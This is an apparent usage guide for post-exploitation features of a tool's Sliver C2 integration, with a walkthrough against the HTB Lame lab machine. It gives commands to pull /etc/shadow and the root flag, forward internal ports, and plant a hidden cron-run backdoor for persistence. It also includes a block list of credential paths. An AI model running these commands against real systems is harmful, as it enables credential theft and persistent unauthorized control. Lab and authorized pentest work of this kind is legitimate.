# Sliver C2 Advanced Features Usage Guide

## Overview

This guide explains how to use the advanced features (Phase 3) of wish's Sliver C2 integration. These features make post-exploitation work more efficient.

## Prerequisites

1. Sliver C2 server is running
2. Sliver implant is deployed on target machine
3. wish can connect to Sliver C2
4. Appropriate configuration file exists (`~/.sliver-client/configs/wish.cfg`)

## Features

### 1. File Operations

#### File Upload
```bash
# Basic usage
/sliver upload <session_id> <local_file> <remote_path>

# Example: Upload tool to target
/sliver upload FANCY_TIGER /tmp/linpeas.sh /tmp/linpeas.sh

# Upload with progress display (automatic)
/sliver upload FANCY_TIGER /home/user/large_file.zip /tmp/data.zip
```

#### File Download
```bash
# Basic usage
/sliver download <session_id> <remote_file> <local_path>

# Example: Get configuration file
/sliver download FANCY_TIGER /etc/passwd ./passwd.txt

# Example: Get database file
/sliver download FANCY_TIGER /var/www/html/config.php ./config.php
```

#### Directory Listing
```bash
# Basic usage
/sliver ls <session_id> <path>

# Example: Check root directory
/sliver ls FANCY_TIGER /

# Example: User's home directory
/sliver ls FANCY_TIGER /home/user
```

### 2. Port Forwarding

#### Create Port Forward
```bash
# Basic usage
/sliver portfwd add <session_id> <local_port> <remote_host:port>

# Example: Forward SMB port
/sliver portfwd add FANCY_TIGER 4445 127.0.0.1:445

# Example: Access internal web server
/sliver portfwd add FANCY_TIGER 8080 192.168.1.100:80
```

#### List Port Forwards
```bash
# Show all port forwards
/sliver portfwd list

# Show only for specific session
/sliver portfwd list FANCY_TIGER
```

#### Remove Port Forward
```bash
# Remove by ID
/sliver portfwd remove <forward_id>

# Example
/sliver portfwd remove a1b2c3d4
```

### 3. Process Management

#### Get Process List
```bash
# Basic usage
/sliver ps <session_id>

# Example: Show all processes
/sliver ps FANCY_TIGER
```

#### Kill Process
```bash
# Basic usage
/sliver kill <session_id> <pid> [-f]

# Example: Normal termination (SIGTERM)
/sliver kill FANCY_TIGER 1234

# Example: Force kill (SIGKILL)
/sliver kill FANCY_TIGER 1234 -f
```

### 4. Screenshot

```bash
# Basic usage
/sliver screenshot <session_id> [output_file]

# Example: Save with default filename
/sliver screenshot FANCY_TIGER

# Example: Save with specified filename
/sliver screenshot FANCY_TIGER desktop_capture.png
```

## Real Usage Example in HTB Lame Environment

### Scenario: Complete Compromise of HTB Lame (10.10.10.3)

```bash
# 1. Check Sliver connection
/sliver status

# 2. Check session list
/sliver implants

# 3. Start interactive shell
/sliver shell FANCY_TIGER

# Basic reconnaissance in shell
whoami
id
pwd
uname -a

# 4. Download important files
/sliver download FANCY_TIGER /etc/passwd ./htb_passwd.txt
/sliver download FANCY_TIGER /etc/shadow ./htb_shadow.txt
/sliver download FANCY_TIGER /root/root.txt ./root_flag.txt

# 5. Internal network reconnaissance
/sliver execute FANCY_TIGER "netstat -tlnp"
/sliver execute FANCY_TIGER "ss -tulnp"

# 6. Set up local access to SMB service
/sliver portfwd add FANCY_TIGER 4445 127.0.0.1:445

# From another terminal
smbclient -L //127.0.0.1 -p 4445

# 7. Process management
/sliver ps FANCY_TIGER

# Check Samba processes
/sliver execute FANCY_TIGER "ps aux | grep smb"

# 8. Establish persistence (example)
/sliver upload FANCY_TIGER /tmp/backdoor.sh /tmp/.backdoor.sh
/sliver execute FANCY_TIGER "chmod +x /tmp/.backdoor.sh"
/sliver execute FANCY_TIGER "echo '*/5 * * * * /tmp/.backdoor.sh' | crontab -"

# 9. Cleanup
/sliver portfwd list
/sliver portfwd remove <port_forward_id>
```

## Security Considerations

### Using SafeSliverConnector

For enhanced safety, use SafeSliverConnector:

```toml
# ~/.wish/config.toml
[c2.sliver.safety]
sandbox_mode = true
read_only = false
max_file_size = 10485760  # 10MB
allowed_commands = [
    "ls", "pwd", "whoami", "id", "cat", "ps", 
    "netstat", "ifconfig", "uname", "env"
]
blocked_paths = [
    "/etc/shadow",
    "/etc/sudoers",
    "/root/.ssh"
]
```

### Limitations

1. **File Size Limit**: Default 10MB maximum
2. **Port Forward**: Privileged ports (<1024) restricted in sandbox mode
3. **Process Management**: System process (PID <= 10) termination restricted
4. **Path Blocking**: Access to security-critical files restricted

## Troubleshooting

### Common Issues and Solutions

1. **"Session not found" Error**
   - Verify session ID or name is correct
   - Check valid sessions with `/sliver implants`

2. **File Transfer Failure**
   - Verify file path is correct
   - Check for permission issues
   - Ensure file size doesn't exceed limit

3. **Port Forward Not Working**
   - Check if local port is already in use
   - Verify firewall settings
   - Ensure remote service is actually running

4. **Process Termination Failure**
   - Check if process already terminated
   - Verify permissions (for root processes)
   - Try force kill with `-f` option

## Performance Tips

1. **Large File Transfers**
   - Monitor transfer status with progress display
   - Compress files before transfer if needed

2. **Process List Optimization**
   - Only first 50 processes shown if output is large
   - Use `execute` with grep to find specific processes

3. **Port Forwarding**
   - Always remove after use to free resources
   - Note there are limits on concurrent connections

## Summary

Sliver C2's advanced features significantly improve post-exploitation work efficiency. By leveraging file transfer, port forwarding, and process management capabilities, you gain complete control over target systems.

Configure security settings appropriately and use responsibly.